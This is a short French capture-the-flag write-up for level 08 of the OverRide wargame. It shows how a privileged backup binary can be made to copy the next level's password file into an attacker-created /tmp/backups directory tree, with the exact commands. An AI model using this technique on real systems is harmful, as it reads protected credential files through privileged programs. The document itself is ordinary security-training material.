# Level 08

Dans ce niveau, on remarque que le binaire nous renvoie :
```sh
level08@OverRide:~$ ./level08
Usage: ./level08 filename
ERROR: Failed to open ./backups/.log
```

Ce qui nous intéresse le plus dans ce retour est le code d'erreur.

Après plusieurs test, On remarque que le projet écrit une copie du fichier que nous donnons
en paramètre dans le dossier `./backup/`.

Donc, en étant malin, on peut faire :
```sh
level08@OverRide:/tmp$ ~/./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

Or, il n'arrive toujours pas à trouver le dossier backup. Il suffit de lui créer les dossiers
qui lui manque.

```sh
mkdir -p /tmp/backups/home/users/level09
~/level08 /home/users/level09/.pass
```

Vous n'avez plus qu'à récupérer le pass dans le dossier.
